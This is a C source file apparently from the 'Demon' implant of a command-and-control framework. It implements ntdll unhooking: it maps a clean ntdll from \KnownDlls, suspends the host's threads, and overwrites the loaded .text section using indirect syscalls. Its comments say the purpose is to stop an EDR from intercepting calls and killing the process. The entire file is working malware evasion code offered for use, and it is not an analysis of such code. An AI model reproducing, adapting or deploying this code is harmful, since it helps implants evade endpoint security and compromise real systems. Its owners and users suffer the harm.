#include <Demon.h>
#include <core/NtdllUnhook.h>
#include <core/MiniStd.h>

/* NtOpenSection and NtMapViewOfSection are not in the Win32 table - resolve inline */
typedef NTSTATUS ( WINAPI* _NtOpenSection      )( PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes );
typedef NTSTATUS ( WINAPI* _NtMapViewOfSection )( HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect );

/* QWORD-aligned copy - avoids __builtin_memcpy which emits unresolved external memcpy at -O0 -nostdlib */
static VOID NtdllCopy( PVOID Dst, PVOID Src, SIZE_T Size )
{
    PULONG64 Dq = ( PULONG64 ) Dst;
    PULONG64 Sq = ( PULONG64 ) Src;
    PBYTE    Db;
    PBYTE    Sb;
    SIZE_T   N  = Size / sizeof( ULONG64 );

    while ( N-- ) *Dq++ = *Sq++;

    Db = ( PBYTE ) Dq;
    Sb = ( PBYTE ) Sq;
    N  = Size % sizeof( ULONG64 );
    while ( N-- ) *Db++ = *Sb++;
}

/* Overwrite loaded ntdll .text with a clean copy from \KnownDlls\ntdll.dll.
 * Steps: resolve NtOpenSection/NtMapViewOfSection inline (not in Win32 table),
 * open KnownDlls section (no disk I/O), map read-only view, find .text by
 * IMAGE_SCN_MEM_EXECUTE, SysNtProtectVirtualMemory(RW) + NtdllCopy + restore.
 * SysInitialize() must run before this function - SYSCALL_INVOKE requires
 * Syscall.SysAddress and Syscall.NtProtectVirtualMemory to be non-zero or it
 * falls back to the hooked Win32 stub which the EDR intercepts and kills the process.
 * NtProtect aliases BaseAddress/RegionSize in-place - use separate ProtAddr/ProtSize
 * locals and reset them before the restore call. */
BOOL UnhookNtdll( VOID )
{
    _NtOpenSection      pNtOpenSection      = NULL;
    _NtMapViewOfSection pNtMapViewOfSection = NULL;
    HANDLE              hSection            = NULL;
    PVOID               CleanBase           = NULL;
    SIZE_T              ViewSize            = 0;
    NTSTATUS            Status              = 0;
    BOOL                Success             = FALSE;
    DWORD               OldProt             = 0;
    WCHAR               SectionPath[]       = L"\\KnownDlls\\ntdll.dll";
    UNICODE_STRING      SectionName         = { 0 };
    OBJECT_ATTRIBUTES   ObjAttr             = { 0 };

    PRINTF( "UnhookNtdll: entry - loaded ntdll=%p\n", Instance->Modules.Ntdll )

    /* verify indirect syscall prerequisites - SYSCALL_INVOKE requires all three to be
     * non-zero; if any is missing it falls back to the hooked Win32 stub, the EDR
     * intercepts the NtProtectVirtualMemory call on ntdll .text and kills the process */
    PRINTF( "UnhookNtdll: SysIndirect=%d  Syscall.SysAddress=%p  Syscall.NtProtectVirtualMemory=0x%04X\n",
            ( INT32 )Instance->Config.Implant.SysIndirect,
            Instance->Syscall.SysAddress,
            ( UINT32 )Instance->Syscall.NtProtectVirtualMemory )

    if ( !Instance->Config.Implant.SysIndirect ) {
        PUTS( "UnhookNtdll: SysIndirect is disabled - indirect syscall not available, skipping unhook" )
        return FALSE;
    }
    if ( !Instance->Syscall.SysAddress ) {
        PUTS( "UnhookNtdll: Syscall.SysAddress is NULL - SysInitialize did not find syscall gadget" )
        return FALSE;
    }
    if ( !Instance->Syscall.NtProtectVirtualMemory ) {
        PUTS( "UnhookNtdll: Syscall.NtProtectVirtualMemory SSN is 0 - SysInitialize failed to extract SSN" )
        return FALSE;
    }

    PUTS( "UnhookNtdll: indirect syscall prerequisites verified - proceeding" )

    /* H_FUNC_NTOPENSECTION=0x134eda0e  H_FUNC_NTMAPVIEWOFSECTION=0xd6649bca */
    pNtOpenSection      = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTOPENSECTION );
    pNtMapViewOfSection = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTMAPVIEWOFSECTION );
    PRINTF( "UnhookNtdll: pNtOpenSection=%p  pNtMapViewOfSection=%p\n",
            pNtOpenSection, pNtMapViewOfSection )

    if ( !pNtOpenSection || !pNtMapViewOfSection ) {
        PUTS( "UnhookNtdll: NtOpenSection/NtMapViewOfSection resolve failed" )
        return FALSE;
    }

    /* manual UNICODE_STRING init - no RtlInitUnicodeString dependency */
    SectionName.Length        = ( USHORT )( sizeof( SectionPath ) - sizeof( WCHAR ) );
    SectionName.MaximumLength = ( USHORT )sizeof( SectionPath );
    SectionName.Buffer        = SectionPath;

    ObjAttr.Length     = sizeof( OBJECT_ATTRIBUTES );
    ObjAttr.ObjectName = &SectionName;
    ObjAttr.Attributes = 0x40; /* OBJ_CASE_INSENSITIVE */

    PRINTF( "UnhookNtdll: UNICODE_STRING Length=%u  MaximumLength=%u\n",
            SectionName.Length, SectionName.MaximumLength )

    /* open the pre-boot \KnownDlls\ntdll.dll section - no disk I/O, always clean */
    Status = pNtOpenSection( &hSection, 0x0004 /*SECTION_MAP_READ*/, &ObjAttr );
    PRINTF( "UnhookNtdll: NtOpenSection status=0x%08lX  hSection=%p\n", Status, hSection )

    if ( !NT_SUCCESS( Status ) ) {
        PRINTF( "UnhookNtdll: NtOpenSection failed 0x%08lX\n", Status )
        return FALSE;
    }

    /* map a read-only view; STATUS_IMAGE_NOT_AT_BASE (0x40000003) is a success warning */
    Status = pNtMapViewOfSection( hSection, NtCurrentProcess(), &CleanBase,
                                  0, 0, NULL, &ViewSize, 1 /*ViewShare*/, 0, PAGE_READONLY );
    PRINTF( "UnhookNtdll: NtMapViewOfSection status=0x%08lX  CleanBase=%p  ViewSize=%zu\n",
            Status, CleanBase, ViewSize )

    /* close section handle regardless of map result - avoid handle leak */
    Instance->Win32.NtClose( hSection );
    PUTS( "UnhookNtdll: section handle closed" )

    if ( !NT_SUCCESS( Status ) ) {
        PRINTF( "UnhookNtdll: NtMapViewOfSection failed 0x%08lX\n", Status )
        return FALSE;
    }

    {
        PVOID             LoadedNtdll = Instance->Modules.Ntdll;
        PIMAGE_DOS_HEADER CleanDos    = C_PTR( CleanBase );
        PIMAGE_NT_HEADERS CleanNt     = C_PTR( U_PTR( CleanBase ) + CleanDos->e_lfanew );
        PIMAGE_SECTION_HEADER Sec     = RVA( PIMAGE_SECTION_HEADER, &CleanNt->OptionalHeader,
                                             CleanNt->FileHeader.SizeOfOptionalHeader );

        /* ISS-001: thread-freeze state - declared here so both the suspension and
         * resumption loops share the same array and count */
        HANDLE                   Suspended[ 128 ] = { 0 };
        DWORD                    SuspCnt          = 0;
        HANDLE                   ThdHndl          = NULL;
        HANDLE                   ThdNext          = NULL;
        BOOL                     ThdSaved         = FALSE;
        THREAD_BASIC_INFORMATION ThdInfo          = { 0 };
        /* current thread ID - skip suspending ourselves */
        ULONG_PTR                MyTid            = U_PTR( Instance->Teb->ClientId.UniqueThread );

        PRINTF( "UnhookNtdll: e_lfanew=0x%lX  NumSections=%u  LoadedNtdll=%p\n",
                CleanDos->e_lfanew, CleanNt->FileHeader.NumberOfSections, LoadedNtdll )

        for ( USHORT i = 0; i < CleanNt->FileHeader.NumberOfSections; i++, Sec++ ) {
            PRINTF( "UnhookNtdll: section[%u] Name=%.8s  Char=0x%08lX  VA=0x%08lX  VSize=0x%lX\n",
                    i, Sec->Name, Sec->Characteristics,
                    Sec->VirtualAddress, Sec->Misc.VirtualSize )

            /* 0x20000000 = IMAGE_SCN_MEM_EXECUTE - always .text on ntdll */
            if ( !( Sec->Characteristics & 0x20000000 ) )
                continue;

            PVOID  CleanText  = C_PTR( U_PTR( CleanBase   ) + Sec->VirtualAddress );
            PVOID  LoadedText = C_PTR( U_PTR( LoadedNtdll ) + Sec->VirtualAddress );
            SIZE_T TextSize   = Sec->Misc.VirtualSize ? Sec->Misc.VirtualSize
                                                      : Sec->SizeOfRawData;

            PRINTF( "UnhookNtdll: .text CleanText=%p  LoadedText=%p  TextSize=%zu\n",
                    CleanText, LoadedText, TextSize )

            /* NtProtect aliases ProtAddr/ProtSize in-place - separate locals prevent
             * corrupting LoadedText/TextSize which are needed for the copy and restore */
            PVOID  ProtAddr = LoadedText;
            SIZE_T ProtSize = TextSize;

            /* ISS-001: suspend all non-current threads before overwriting ntdll .text -
             * concurrent ntdll execution on a partially-written cache line causes #GP/#UD faults */
            ThdHndl  = NULL;
            ThdSaved = FALSE;
            SuspCnt  = 0;
            while ( NT_SUCCESS( SysNtGetNextThread( NtCurrentProcess(), ThdHndl, THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION, 0, 0, &ThdNext ) ) )
            {
                /* close previous handle only if it was not saved to the Suspended array */
                if ( ThdHndl && !ThdSaved )
                    SysNtClose( ThdHndl );

                ThdHndl  = ThdNext;
                ThdSaved = FALSE;

                MemSet( &ThdInfo, 0, sizeof( ThdInfo ) );
                if ( NT_SUCCESS( SysNtQueryInformationThread( ThdHndl, ThreadBasicInformation, &ThdInfo, sizeof( ThdInfo ), NULL ) )
                     && U_PTR( ThdInfo.ClientId.UniqueThread ) != MyTid
                     && SuspCnt < 128 )
                {
                    if ( NT_SUCCESS( SysNtSuspendThread( ThdHndl, NULL ) ) )
                    {
                        Suspended[ SuspCnt++ ] = ThdHndl;
                        ThdSaved               = TRUE;
                    }
                }
            }
            /* close the last enumerated handle if it was not saved */
            if ( ThdHndl && !ThdSaved )
                SysNtClose( ThdHndl );
            PRINTF( "UnhookNtdll: suspended %u host threads before NtdllCopy\n", SuspCnt )

            Status = SysNtProtectVirtualMemory(
                         NtCurrentProcess(), &ProtAddr, &ProtSize, PAGE_EXECUTE_WRITECOPY, &OldProt );
            PRINTF( "UnhookNtdll: NtProtect(RW) status=0x%08lX  OldProt=0x%08lX\n",
                    Status, ( ULONG )OldProt )

            if ( !NT_SUCCESS( Status ) ) {
                PRINTF( "UnhookNtdll: NtProtect(RW) failed 0x%08lX - cannot overwrite\n", Status )
                /* resume threads even if we cannot proceed with the overwrite */
                for ( DWORD i = 0; i < SuspCnt; i++ )
                {
                    SysNtResumeThread( Suspended[ i ], NULL );
                    SysNtClose( Suspended[ i ] );
                }
                break;
            }

            /* QWORD loop - __builtin_memcpy emits unresolved memcpy at -O0 -nostdlib */
            NtdllCopy( LoadedText, CleanText, TextSize );
            PRINTF( "UnhookNtdll: NtdllCopy complete - %zu bytes written\n", TextSize )

            /* reset ProtAddr/ProtSize - NtProtect page-aligned them in the first call */
            ProtAddr = LoadedText;
            ProtSize = TextSize;
            Status   = SysNtProtectVirtualMemory(
                           NtCurrentProcess(), &ProtAddr, &ProtSize, OldProt, &OldProt );
            PRINTF( "UnhookNtdll: NtProtect(restore) status=0x%08lX  RestoredProt=0x%08lX\n",
                    Status, ( ULONG )OldProt )

            /* resume all suspended threads now that ntdll .text is restored to PAGE_EXECUTE_READ */
            for ( DWORD i = 0; i < SuspCnt; i++ )
            {
                SysNtResumeThread( Suspended[ i ], NULL );
                SysNtClose( Suspended[ i ] );
            }
            PRINTF( "UnhookNtdll: resumed %u host threads\n", SuspCnt )

            Success = TRUE;
            break;
        }

        if ( !Success )
            PUTS( "UnhookNtdll: no executable section found or protection change failed" )
    }

    Instance->Win32.NtUnmapViewOfSection( NtCurrentProcess(), CleanBase );
    PRINTF( "UnhookNtdll: clean view unmapped - returning %d\n", Success )

    return Success;
}
